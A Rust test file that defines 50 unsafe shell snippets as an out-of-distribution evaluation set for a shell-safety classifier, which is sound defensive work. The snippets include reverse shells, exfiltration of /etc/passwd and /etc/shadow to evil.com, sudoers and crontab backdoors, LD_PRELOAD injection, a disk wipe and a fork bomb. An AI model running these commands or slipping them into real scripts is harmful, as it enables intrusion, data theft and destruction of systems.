//! Out-of-distribution generalization test scripts (SSC v11 Section 5.6).
//!
//! 50 hand-written unsafe scripts with NO lexical overlap with the training
//! corpus. These use novel injection patterns, non-determinism sources, race
//! conditions, and privilege escalation that aren't in the linter's 14 rules.
//!
//! Purpose: If the classifier only catches `eval` and `$RANDOM` but misses
//! these, it's a keyword matcher. Document honestly.

/// A generalization test case.
pub struct GeneralizationTest {
    pub id: &'static str,
    pub category: &'static str,
    pub description: &'static str,
    pub script: &'static str,
    pub expected_label: u8, // 1 = unsafe
}

/// All 50 generalization test scripts (SSC v11 Section 5.6, F8 mitigation).
pub fn generalization_tests() -> Vec<GeneralizationTest> {
    vec![
        // === Novel injection patterns (not eval, not curl|bash) ===
        GeneralizationTest {
            id: "GEN-001",
            category: "injection",
            description: "source from wget download",
            script: "source <(wget -qO- \"$url\")",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-002",
            category: "injection",
            description: "bash -c with untrusted variable",
            script: "bash -c \"$untrusted\"",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-003",
            category: "injection",
            description: "dot-source from heredoc",
            script: ". /dev/stdin <<< \"$payload\"",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-004",
            category: "injection",
            description: "exec with user-controlled path",
            script: "exec \"$user_binary\"",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-005",
            category: "injection",
            description: "xargs command injection",
            script: "find /tmp -name '*.sh' | xargs sh",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-006",
            category: "injection",
            description: "env var in shebang-like pattern",
            script: "#!/usr/bin/env \"$interpreter\"\necho running",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-007",
            category: "injection",
            description: "ssh command injection",
            script: "ssh user@host \"$remote_cmd\"",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-008",
            category: "injection",
            description: "awk system() injection",
            script: "awk '{system($1)}' input.txt",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-009",
            category: "injection",
            description: "perl -e injection",
            script: "perl -e \"$perl_code\"",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-010",
            category: "injection",
            description: "su -c injection",
            script: "su -c \"$admin_cmd\" root",
            expected_label: 1,
        },
        // === Novel non-determinism (not $RANDOM, not date) ===
        GeneralizationTest {
            id: "GEN-011",
            category: "non-determinism",
            description: "shuf random word selection",
            script: "shuf -n1 /usr/share/dict/words",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-012",
            category: "non-determinism",
            description: "urandom via od",
            script: "od -An -N4 -tu4 /dev/urandom",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-013",
            category: "non-determinism",
            description: "random via xxd",
            script: "head -c8 /dev/random | xxd -p",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-014",
            category: "non-determinism",
            description: "uuid generation",
            script: "cat /proc/sys/kernel/random/uuid",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-015",
            category: "non-determinism",
            description: "hostname-dependent behavior",
            script: "case $(hostname) in prod*) deploy;; *) test;; esac",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-016",
            category: "non-determinism",
            description: "uptime-dependent logic",
            script: "if [ $(uptime -s | cut -d' ' -f2) \\> '12:00' ]; then restart; fi",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-017",
            category: "non-determinism",
            description: "process count dependency",
            script: "nproc=$(ps aux | wc -l); echo \"$nproc processes\"",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-018",
            category: "non-determinism",
            description: "network-dependent check",
            script: "ping -c1 -W1 8.8.8.8 && echo online || echo offline",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-019",
            category: "non-determinism",
            description: "disk space conditional",
            script: "avail=$(df -m / | awk 'NR==2{print $4}'); [ \"$avail\" -lt 100 ] && cleanup",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-020",
            category: "non-determinism",
            description: "load average check",
            script: "load=$(cat /proc/loadavg | cut -d' ' -f1); echo \"Load: $load\"",
            expected_label: 1,
        },
        // === Novel race conditions ===
        GeneralizationTest {
            id: "GEN-021",
            category: "race-condition",
            description: "TOCTOU file check",
            script: "[ -f \"$lock\" ] || touch \"$lock\"",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-022",
            category: "race-condition",
            description: "TOCTOU directory operation",
            script: "test -d \"$dir\" && cd \"$dir\" && rm -rf .",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-023",
            category: "race-condition",
            description: "PID file race",
            script: "if [ ! -f /var/run/app.pid ]; then echo $$ > /var/run/app.pid; fi",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-024",
            category: "race-condition",
            description: "temp file race with predictable name",
            script: "tmpfile=/tmp/work_$$; echo data > $tmpfile; process $tmpfile; rm $tmpfile",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-025",
            category: "race-condition",
            description: "symlink race attack surface",
            script: "ln -s /etc/shadow /tmp/output; cat /tmp/output",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-026",
            category: "race-condition",
            description: "background process race",
            script: "start_server &\nsleep 1\ncurl localhost:8080",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-027",
            category: "race-condition",
            description: "signal race in cleanup",
            script: "trap '' INT TERM; rm -rf /tmp/sensitive; trap - INT TERM",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-028",
            category: "race-condition",
            description: "port binding race",
            script: "port=$(shuf -i 8000-9000 -n1); nc -l $port &",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-029",
            category: "race-condition",
            description: "file descriptor leak",
            script: "exec 3>/tmp/lockfile; flock -n 3 || exit 1",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-030",
            category: "race-condition",
            description: "concurrent append race",
            script: "echo $(date) >> /var/log/app.log",
            expected_label: 1,
        },
        // === Novel privilege issues ===
        GeneralizationTest {
            id: "GEN-031",
            category: "privilege",
            description: "setuid binary installation",
            script: "install -m 4755 ./binary /usr/local/bin/",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-032",
            category: "privilege",
            description: "setcap on binary",
            script: "setcap cap_net_raw+ep ./tool",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-033",
            category: "privilege",
            description: "world-writable file creation",
            script: "chmod 777 /etc/cron.d/backup",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-034",
            category: "privilege",
            description: "sudoers modification",
            script: "echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-035",
            category: "privilege",
            description: "chown to root",
            script: "chown root:root /tmp/exploit && chmod +s /tmp/exploit",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-036",
            category: "privilege",
            description: "docker socket mount",
            script: "docker run -v /var/run/docker.sock:/var/run/docker.sock alpine",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-037",
            category: "privilege",
            description: "crontab injection",
            script: "echo '* * * * * /tmp/backdoor.sh' | crontab -",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-038",
            category: "privilege",
            description: "authorized_keys injection",
            script: "echo \"$pubkey\" >> ~/.ssh/authorized_keys",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-039",
            category: "privilege",
            description: "PATH manipulation",
            script: "export PATH=/tmp/evil:$PATH",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-040",
            category: "privilege",
            description: "LD_PRELOAD injection",
            script: "LD_PRELOAD=/tmp/evil.so /usr/bin/target",
            expected_label: 1,
        },
        // === Novel data exfiltration ===
        GeneralizationTest {
            id: "GEN-041",
            category: "exfiltration",
            description: "DNS exfiltration",
            script: "data=$(cat /etc/passwd | base64); nslookup $data.evil.com",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-042",
            category: "exfiltration",
            description: "reverse shell",
            script: "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-043",
            category: "exfiltration",
            description: "netcat reverse shell",
            script: "nc -e /bin/sh 10.0.0.1 4242",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-044",
            category: "exfiltration",
            description: "curl POST secrets",
            script: "curl -X POST -d @/etc/shadow https://evil.com/collect",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-045",
            category: "exfiltration",
            description: "scp file exfiltration",
            script: "scp /etc/passwd attacker@evil.com:/loot/",
            expected_label: 1,
        },
        // === Novel destructive operations ===
        GeneralizationTest {
            id: "GEN-046",
            category: "destructive",
            description: "dd disk wipe",
            script: "dd if=/dev/zero of=/dev/sda bs=1M",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-047",
            category: "destructive",
            description: "fork bomb",
            script: ":(){ :|:& };:",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-048",
            category: "destructive",
            description: "kernel panic trigger",
            script: "echo c > /proc/sysrq-trigger",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-049",
            category: "destructive",
            description: "iptables flush (network disruption)",
            script: "iptables -F && iptables -X && iptables -P INPUT DROP",
            expected_label: 1,
        },
        GeneralizationTest {
            id: "GEN-050",
            category: "destructive",
            description: "recursive permission removal",
            script: "chmod -R 000 /var/lib/",
            expected_label: 1,
        },
    ]
}

/// Category counts for reporting.
pub fn category_summary(tests: &[GeneralizationTest]) -> Vec<(&'static str, usize)> {
    let mut counts: std::collections::BTreeMap<&str, usize> = std::collections::BTreeMap::new();
    for t in tests {
        *counts.entry(t.category).or_default() += 1;
    }
    counts.into_iter().collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_exactly_50_generalization_tests() {
        let tests = generalization_tests();
        assert_eq!(tests.len(), 50, "SSC v11 Section 5.6 requires exactly 50 tests");
    }

    #[test]
    fn test_all_expected_unsafe() {
        let tests = generalization_tests();
        for t in &tests {
            assert_eq!(
                t.expected_label, 1,
                "GEN test {} should be labeled unsafe",
                t.id
            );
        }
    }

    #[test]
    fn test_unique_ids() {
        let tests = generalization_tests();
        let mut ids: Vec<&str> = tests.iter().map(|t| t.id).collect();
        ids.sort();
        ids.dedup();
        assert_eq!(ids.len(), 50, "All GEN test IDs must be unique");
    }

    #[test]
    fn test_category_coverage() {
        let tests = generalization_tests();
        let summary = category_summary(&tests);
        let categories: Vec<&str> = summary.iter().map(|(c, _)| *c).collect();
        assert!(categories.contains(&"injection"), "Must have injection tests");
        assert!(
            categories.contains(&"non-determinism"),
            "Must have non-determinism tests"
        );
        assert!(
            categories.contains(&"race-condition"),
            "Must have race-condition tests"
        );
        assert!(categories.contains(&"privilege"), "Must have privilege tests");
        assert!(
            categories.contains(&"exfiltration"),
            "Must have exfiltration tests"
        );
        assert!(
            categories.contains(&"destructive"),
            "Must have destructive tests"
        );
    }

    #[test]
    fn test_non_empty_scripts() {
        let tests = generalization_tests();
        for t in &tests {
            assert!(!t.script.is_empty(), "GEN test {} has empty script", t.id);
            assert!(
                !t.description.is_empty(),
                "GEN test {} has empty description",
                t.id
            );
        }
    }

    #[test]
    fn test_category_summary_counts() {
        let tests = generalization_tests();
        let summary = category_summary(&tests);
        let total: usize = summary.iter().map(|(_, c)| c).sum();
        assert_eq!(total, 50);
    }

    #[test]
    fn test_ids_sequential() {
        let tests = generalization_tests();
        for (i, t) in tests.iter().enumerate() {
            let expected_id = format!("GEN-{:03}", i + 1);
            assert_eq!(t.id, expected_id, "IDs must be sequential");
        }
    }
}
